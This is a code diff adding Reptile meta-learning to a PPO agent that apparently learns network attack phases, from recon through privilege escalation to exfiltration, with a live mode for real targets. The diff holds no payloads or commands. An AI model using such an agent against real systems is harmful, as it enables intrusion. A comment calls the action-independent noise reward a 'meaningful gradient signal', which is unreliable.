+    ) -> Dict[str, Any]:
+        """Execute one Reptile meta-optimization step with proper state handling.
+
+        Fixes the 3 bugs from the old degenerate implementation:
+        1. Optimizer state: snapshot/restore Adam momentum + variance
+        2. Per-scenario buffers: each scenario gets a fresh rollout buffer
+        3. Cooldown: caller gates by _reptile_episode_cooldown
+
+        Args:
+            episode_number: Current episode number for logging.
+
+        Returns:
+            Dict with meta-step statistics from ReptileMeta.meta_step().
+        """
+        import copy
+        import torch
+        from core.models.state_encoder import encode_state
+
+        # Find first coach with a working PPO agent
+        _ppo = None
+        _coach = None
+        for _cname, _cobj in self.coaches.items():
+            _cppo = getattr(_cobj, 'ppo_agent', None)
+            if _cppo is not None:
+                _ppo = _cppo
+                _coach = _cobj
+                break
+
+        if _ppo is None or self.reptile is None:
+            return {"skipped": True, "reason": "no_ppo"}
+
+        _network = _ppo.network
+        _device = _ppo.device
+
+        # ── Snapshot optimizer + EMA + counter state (Fix #1) ────────
+        _optimizer_snapshot = copy.deepcopy(_ppo.optimizer.state_dict())
+        _lr_scheduler_snapshot = copy.deepcopy(_ppo.lr_scheduler.state_dict())
+        _updates_done_snapshot = _ppo.updates_done
+        _ema_snapshot = None
+        if _ppo.ema_network is not None:
+            _ema_snapshot = copy.deepcopy(_ppo.ema_network.state_dict())
+
+        # ── Build inner_train_fn with per-scenario buffers (Fix #2) ──
+        # Each scenario configures the env with different ports/services,
+        # runs K simulated steps, collects a fresh buffer, and calls
+        # ppo.update() on that scenario-specific data.
+        def _inner_train_fn(
+            model: Any, scenario_name: str, inner_steps: int
+        ) -> Dict[str, Any]:
+            """Per-scenario inner loop for Reptile."""
+            from core.algorithms.reptile_meta import SCENARIO_PROFILES
+
+            profile = SCENARIO_PROFILES.get(scenario_name, {})
+            typical_ports = profile.get("typical_ports", [80, 443, 22])
+            difficulty = profile.get("difficulty", 0.5)
+            phase_weights = profile.get("phase_weights", {})
+
+            # Save the main env state, configure for scenario
+            _saved_ports = list(self.env.open_ports)
+            _saved_services = list(self.env.services)
+            _saved_phase = self.env.current_phase
+            _saved_live = self.env.live_mode
+
+            # Temporarily switch to simulated mode for inner loop
+            self.env.live_mode = False
+            self.env.open_ports = sorted(typical_ports)
+            self.env.services = self._scenario_ports_to_services(typical_ports)
+            # Set phase to first weighted phase
+            if phase_weights:
+                _start_phase = max(phase_weights, key=phase_weights.get)
+                self.env.current_phase = _start_phase.lower()
+            else:
+                self.env.current_phase = "recon"
+
+            # Save and reset rollout buffer (Fix #2)
+            _saved_buffer_states = list(_ppo.buffer.states)
+            _saved_buffer_actions = list(_ppo.buffer.actions)
+            _saved_buffer_log_probs = list(_ppo.buffer.log_probs)
+            _saved_buffer_rewards = list(_ppo.buffer.rewards)
+            _saved_buffer_values = list(_ppo.buffer.values)
+            _saved_buffer_dones = list(_ppo.buffer.dones)
+            _saved_buffer_size = _ppo.buffer.size
+            _saved_buffer_teacher_dist = list(_ppo.buffer.teacher_distributions)
+            _saved_buffer_teacher_act = list(_ppo.buffer.teacher_actions)
+            _ppo.buffer.reset()
+
+            # Run K simulated steps collecting scenario-specific data
+            total_reward = 0.0
+            _phase_reward_map = {
+                "recon": 1.0, "enumeration": 2.5, "exploitation": 5.0,
+                "privilege_escalation": 8.0, "lateral_movement": 6.0,
+                "post_exploitation": 7.0, "exfiltration": 9.0,
+            }
+            _base_reward = _phase_reward_map.get(
+                self.env.current_phase, 1.0
+            ) * difficulty
+            import random as _rng
+            for _k in range(inner_steps):
+                state = self.env.get_global_state()
+                state_tensor = encode_state(state, _device)
+
+                # Get action mask from coach if available
+                action_mask = None
+                if _coach is not None and hasattr(_coach, '_get_action_mask'):
+                    try:
+                        action_mask = _coach._get_action_mask(state)
+                    except Exception:
+                        pass
+
+                action_idx, log_prob, value = _ppo.select_action(
+                    state_tensor, training=True, action_mask=action_mask,
+                )
+
+                # Varied reward: base from phase×difficulty + random noise
+                # This gives PPO a meaningful gradient signal per scenario.
+                _sim_reward = _base_reward + _rng.gauss(0, 0.5 * difficulty)
+                _ppo.buffer.add(
+                    state=state_tensor,
+                    action=action_idx,
+                    log_prob=log_prob,
+                    reward=_sim_reward,
+                    value=value,
+                    done=(_k == inner_steps - 1),
+                )
+                total_reward += _sim_reward
+
+            # Run PPO update on scenario-specific buffer
+            _update_metrics = {}
+            if _ppo.buffer.size >= _ppo.config.minibatch_size:
+                _update_metrics = _ppo.update(last_value=0.0)
+            else:
+                # Not enough data — still count as a training step
+                _update_metrics = {"skipped": True, "buffer_size": _ppo.buffer.size}
+
+            # Restore main buffer state
+            _ppo.buffer.reset()
+            _ppo.buffer.states = _saved_buffer_states
+            _ppo.buffer.actions = _saved_buffer_actions
+            _ppo.buffer.log_probs = _saved_buffer_log_probs
+            _ppo.buffer.rewards = _saved_buffer_rewards
+            _ppo.buffer.values = _saved_buffer_values
+            _ppo.buffer.dones = _saved_buffer_dones
+            _ppo.buffer.size = _saved_buffer_size
+            _ppo.buffer.teacher_distributions = _saved_buffer_teacher_dist
+            _ppo.buffer.teacher_actions = _saved_buffer_teacher_act
+
+            # Restore env state
+            self.env.open_ports = _saved_ports
+            self.env.services = _saved_services
+            self.env.current_phase = _saved_phase
+            self.env.live_mode = _saved_live
+
+            return {
+                "loss": _update_metrics.get("policy_loss", 0.0),
+                "reward": total_reward,
+                "scenario": scenario_name,
+                "steps": inner_steps,
+                "success": total_reward > 0,
+            }
+
+        # ── Run Reptile meta-step ────────────────────────────────────
+        _maturity = 0.0
+        if self._maturity_controller is not None:
+            _maturity = getattr(
+                self._maturity_controller.state, 'maturity', 0.0
+            )
+
+        stats = self.reptile.meta_step(
+            model=_network,
+            inner_train_fn=_inner_train_fn,
+            global_step=self._reptile_global_step,
+            maturity=_maturity,
+        )
+        self._reptile_global_step += 1
+
+        # ── Restore optimizer + EMA + counter state (Fix #1 completion) ─
+        # After Reptile interpolation, Adam momentum/variance are stale.
+        # Reset optimizer so it starts fresh with the interpolated weights.
+        _ppo.optimizer.load_state_dict(_optimizer_snapshot)
+        _ppo.lr_scheduler.load_state_dict(_lr_scheduler_snapshot)
+        _ppo.updates_done = _updates_done_snapshot
+        if _ema_snapshot is not None and _ppo.ema_network is not None:
+            _ppo.ema_network.load_state_dict(_ema_snapshot)
+
+        return stats
+
+    @staticmethod
+    def _scenario_ports_to_services(ports: List[int]) -> List[str]:
+        """Map typical ports to service names for scenario configuration."""
+        _port_service_map = {
+            21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp",
+            53: "dns", 80: "http", 88: "kerberos", 110: "pop3",
+            135: "msrpc", 139: "netbios-ssn", 143: "imap",
+            389: "ldap", 443: "https", 445: "microsoft-ds",
+            554: "rtsp", 636: "ldaps", 993: "imaps", 995: "pop3s",
+            1337: "waste", 1433: "ms-sql-s", 1883: "mqtt",
+            3000: "ppp", 3268: "globalcatLDAP", 3306: "mysql",
+            3389: "ms-wbt-server", 5000: "upnp", 5432: "postgresql",
+            5985: "wsman", 6379: "redis", 6667: "irc",
+            8080: "http-proxy", 8180: "unknown", 8443: "https-alt",
+            8585: "unknown", 9200: "wap-wsp", 9999: "abyss",
+            27017: "mongod", 31337: "Elite",
+        }
+        services = []
+        for p in ports:
+            svc = _port_service_map.get(p)
+            if svc:
+                services.append(svc)
+            else:
+                services.append(f"unknown-{p}")
+        return services
+
     def _compute_episode_metrics(
         self,
         step_results: List[List[SmartStepResult]],
@@ -8240,6 +8771,28 @@ class SmartOrchestrator:
             )
         except Exception as e:
             logger.debug(f"Phase 10.2: Training start banner failed: {e}")
+        
+        # ─── STRUCTURAL CONSOLIDATION: Boot-time IntegrityCheck ──────
+        # Pre-inject MaturityController into coaches so boot check
+        # sees it; _start_episode() will refresh it each episode.
+        if self._maturity_controller is not None:
+            for _cname, _coach in self.coaches.items():
+                _coach._maturity_controller = self._maturity_controller
+
+        from core.decision.integrity_check import IntegrityCheck
+        _first_coach = next(iter(self.coaches.values()), None)
+        self._integrity_check: Optional[Any] = None
+        if _first_coach is not None:
+            self._integrity_check = IntegrityCheck()
+            _boot_report = self._integrity_check.check_boot(
+                _first_coach, self
+            )
+            if _boot_report.passed:
+                logger.info(
+                    f"[INTEGRITY] Boot check passed: "
+                    f"{_boot_report.checks_run} checks OK"
+                )
+            # If not passed, check_boot raises RuntimeError
         
         # Phase 24: Single continuous run — no episode loop
         episode_id = f"{self.run_id}_ep0000"
